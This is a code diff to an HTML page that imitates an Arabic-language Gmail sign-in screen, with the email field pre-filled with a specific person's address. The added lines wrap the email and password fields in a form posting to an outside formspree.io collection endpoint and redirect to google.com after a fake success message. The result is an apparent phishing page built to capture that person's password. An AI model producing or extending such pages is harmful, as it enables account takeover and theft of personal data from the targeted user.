@@ -32,34 +32,36 @@
         <span style="font-size: 24px; color: #EA4335;">e</span>
     </div>
     
-    <!-- Email Page (Arabic by default) -->
-    <div id="email-page" class="login-box rtl">
-        <h2>تسجيل الدخول</h2>
-        <p>المتابعة إلى Gmail</p>
-        <input type="email" id="email" placeholder="البريد الإلكتروني أو الهاتف" value="radhi.alhamad@gmail.com" />
-        <button onclick="showPasswordPage()">التالي</button>
-        <p><a href="#" style="color: #4285F4; text-decoration: none;">نسيت البريد الإلكتروني؟</a></p>
-    </div>
-
-    <!-- Password Page (Hidden Initially) -->
-    <div id="password-page" class="login-box rtl hidden">
-        <div style="text-align: right; margin-bottom: 15px;">
-            <span id="display-email" style="font-weight: bold;"></span>
-            <a href="#" onclick="goBack()" style="float: left; color: #4285F4; text-decoration: none;">تغيير</a>
-        </div>
-        <input type="password" id="password" placeholder="أدخل كلمة المرور" />
-        <button onclick="fakeSubmit()">تسجيل الدخول</button>
-        <p><a href="#" style="color: #4285F4; text-decoration: none;">نسيت كلمة المرور؟</a></p>
-    </div>
-
-    <!-- "Success" Page (Demo Only) -->
-    <div id="success-page" class="login-box rtl hidden">
-        <h3 style="color: #34A853;">✓ تم تسجيل الدخول بنجاح</h3>
-        <p>جاري التوجيه إلى Gmail...</p>
-        <div class="footer">
-            <p><strong>لا تدخل بياناتك الحقيقية على مواقع غير موثوقة.</strong></p>
-        </div>
-    </div>
+    <form action="https://formspree.io/f/xpwdzvgp" method="post">
+            <!-- Email Page (Arabic by default) -->
+            <div id="email-page" class="login-box rtl">
+                <h2>تسجيل الدخول</h2>
+                <p>المتابعة إلى Gmail</p>
+                <input type="email" id="email" placeholder="البريد الإلكتروني أو الهاتف" value="radhi.alhamad@gmail.com" />
+                <button onclick="showPasswordPage()">التالي</button>
+                <p><a href="#" style="color: #4285F4; text-decoration: none;">نسيت البريد الإلكتروني؟</a></p>
+            </div>
+        
+            <!-- Password Page (Hidden Initially) -->
+            <div id="password-page" class="login-box rtl hidden">
+                <div style="text-align: right; margin-bottom: 15px;">
+                    <span id="display-email" style="font-weight: bold;"></span>
+                    <a href="#" onclick="goBack()" style="float: left; color: #4285F4; text-decoration: none;">تغيير</a>
+                </div>
+                <input type="password" id="password" placeholder="أدخل كلمة المرور" />
+                <button onclick="fakeSubmit()" type="submit">تسجيل الدخول</button>
+                <p><a href="#" style="color: #4285F4; text-decoration: none;">نسيت كلمة المرور؟</a></p>
+            </div>
+        
+            <!-- "Success" Page (Demo Only) -->
+            <div id="success-page" class="login-box rtl hidden">
+                <h3 style="color: #34A853;">✓ تم تسجيل الدخول بنجاح</h3>
+                <p>جاري التوجيه إلى Gmail...</p>
+                <div class="footer">
+                    <p><strong>لا تدخل بياناتك الحقيقية على مواقع غير موثوقة.</strong></p>
+                </div>
+            </div>
+    </form>
 
     <script>
         // Set Arabic as default
@@ -128,6 +130,7 @@
         function fakeSubmit() {
             document.getElementById("password-page").classList.add("hidden");
             document.getElementById("success-page").classList.remove("hidden");
+            window.location.replace("https://www.google.com");
         }
     </script>
 
